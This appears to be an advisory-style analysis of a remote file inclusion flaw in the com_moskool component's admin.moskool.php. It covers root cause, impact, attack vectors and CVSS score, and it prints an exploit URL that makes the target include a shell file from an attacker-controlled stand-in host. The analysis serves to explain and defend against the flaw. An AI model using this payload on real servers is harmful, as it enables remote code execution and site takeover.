Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:** The vulnerability lies in the `com_moskool` component, specifically within the `admin.moskool.php` file. It stems from a failure to sanitize user-supplied input, particularly the `mosConfig_absolute_path` parameter. This lack of sanitization allows for the inclusion of remote files.

**Weaknesses/Vulnerabilities:**
*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The application directly includes a file path provided by the attacker via the `mosConfig_absolute_path` parameter.

**Impact of Exploitation:**
*   **Arbitrary Code Execution:** By including a malicious file, an attacker can execute arbitrary code on the server. This could lead to a complete compromise of the system.
*   **Data Theft and Manipulation:** The attacker can potentially access and modify sensitive data stored on the server, depending on the included file's payload.

**Attack Vectors:**
*   **HTTP GET Parameter:** The attack vector is through the HTTP GET parameter `mosConfig_absolute_path`. The attacker crafts a URL with this parameter set to point to a malicious file hosted on an attacker-controlled server.
*   **Remote:** The vulnerability is remotely exploitable.

**Required Attacker Capabilities/Position:**
*   **Basic HTTP knowledge:** The attacker needs to be able to craft HTTP GET requests.
*   **Access to the Vulnerable Application:** The attacker needs to be able to access the vulnerable web application.
*   **Ability to host a malicious file:** The attacker needs to host a file, often a text file containing PHP code or shell commands, on a server they control. This file is then included via the RFI vulnerability.

**Technical Details:**

The exploit URL provided is:
`http://[target]/component/option,com_moskool/Itemid,34/admin.moskool.php?mosConfig_absolute_path?=http://sit/shell.txt?cmd`

This URL demonstrates how an attacker can include a remote file.

*   `[target]` is the address of the vulnerable web server.
*   `component/option,com_moskool/Itemid,34/admin.moskool.php`  is the path to the vulnerable file.
*   `mosConfig_absolute_path?=http://sit/shell.txt?cmd`  is the malicious parameter, where:
    *   `mosConfig_absolute_path` is the vulnerable parameter.
    *   `http://sit/shell.txt` is the URL of the attacker's malicious file.
    *   `?cmd` is a GET parameter that may be specific to the attacker's hosted shell file.

**Additional Notes:**
*   The provided description also notes a Google search query to find vulnerable targets, indicating that this vulnerability is easily discoverable.
*   The CVSS score is 7.5, indicating a high severity vulnerability with remote exploitability, low attack complexity, no authentication required and partial impacts on confidentiality, integrity, and availability.
